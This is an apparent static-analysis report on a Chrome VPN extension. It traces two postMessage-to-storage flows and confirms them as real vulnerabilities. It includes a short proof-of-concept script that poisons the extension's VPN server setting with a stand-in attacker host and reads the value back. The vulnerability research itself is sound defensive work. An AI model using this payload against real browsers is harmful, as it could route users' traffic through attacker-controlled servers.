# CoCo Analysis: jcbiifklmgnkppebelchllpdbnibihel

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple flows including cs_window_eventListener_message → chrome_storage_local_set_sink and storage_local_get_source → window_postMessage_sink

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jcbiifklmgnkppebelchllpdbnibihel/opgen_generated_files/cs_0.js
Line 546: `window.addEventListener("message", function(event) {`
Line 553: `if (event.data.action === 'maybe-blocked') {`
Line 599: `chrome.runtime.sendMessage({action: "connect",server:event.data.text}, function(response) {`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jcbiifklmgnkppebelchllpdbnibihel/opgen_generated_files/bg.js
Line 1048: `var vars = request.server.split(",");`
Line 1051: `doConnection(vars[2],vars[0],parseInt(vars[1]),false);` → stores to chrome.storage.local

**Code:**

```javascript
// Content script - Entry point (cs_0.js line 546)
window.addEventListener("message", function(event) {
  // We only accept messages from ourselves
  if (event.source != window) {
    return;
  }

  if (event.data.type && (event.data.type == "FROM_PAGE")) {
    var data = { type: "FROM_EXTENSION", text: "connecting" };
    window.postMessage(data, "*");
    chrome.runtime.sendMessage({action: "connect", server:event.data.text}, function(response) { // ← attacker-controlled
    });
  }
});

// Background script - Message handler (bg.js line 1014)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (sender.id == "lochiccbgeohimldjooaakjllnafhaid" || sender.id == "jcbiifklmgnkppebelchllpdbnibihel") {
    if (request.action == "connect") {
      sendResponse('received');
      if (request.server == "Direct Connection") { disconnect(); }
      else { connect(request.server, request.failSafe); } // ← stores to chrome.storage.local
    }
    if (request.action == "connectGlobal") {
      var vars = request.server.split(","); // ← attacker-controlled
      doConnection(vars[2], vars[0], parseInt(vars[1]), false); // ← stores to chrome.storage.local
    }
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

## Sink 2: storage_local_get_source → window_postMessage_sink (Complete Exploitation Chain)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jcbiifklmgnkppebelchllpdbnibihel/opgen_generated_files/cs_0.js
Line 418: `var storage_local_get_source = { 'key': 'value' };`
Line 559: `var pdata = { type: "FROM_EXTENSION_SERVER", text: rescon.connected };`
Line 560: `window.postMessage(pdata, "*");`

**Code:**

```javascript
// Content script - Complete exploitation chain (cs_0.js)
window.addEventListener("message", function(event) {
  if (event.source != window) {
    return;
  }

  // 1. Attacker poisons storage
  if (event.data.type && (event.data.type == "FROM_PAGE")) {
    chrome.runtime.sendMessage({action: "connect", server:event.data.text}, function(response) { // ← attacker-controlled
      // This stores to chrome.storage.local via background script
    });
  }

  // 2. Attacker triggers storage read
  if (event.data.action === 'whatServer') {
    chrome.storage.local.get('connected', function (rescon) {
      var pdata = { type: "FROM_EXTENSION_SERVER", text: rescon.connected }; // ← poisoned data
      window.postMessage(pdata, "*"); // ← sent back to attacker
    });
  }
});
```

**Attack:**

```javascript
// On any webpage where the content script runs (http://*/* or https://*/*)
// Step 1: Poison storage with attacker-controlled server value
window.postMessage({ type: "FROM_PAGE", text: "malicious.attacker.com:8080" }, "*");

// Step 2: Trigger storage read to retrieve poisoned value
window.postMessage({ action: "whatServer" }, "*");

// Step 3: Listen for response with poisoned data
window.addEventListener("message", function(event) {
  if (event.data.type === "FROM_EXTENSION_SERVER") {
    console.log("Poisoned server value:", event.data.text);
    // Attacker now has confirmation of poisoned value
  }
});
```

**Impact:** Complete storage exploitation chain allowing attacker to poison extension's VPN server configuration and read it back. Attacker can manipulate which VPN server the extension connects to, potentially redirecting user traffic through attacker-controlled servers. The extension accepts window.postMessage from any webpage without origin validation (only checks event.source == window), making it exploitable on any site where the content script runs (all HTTP/HTTPS pages per manifest).
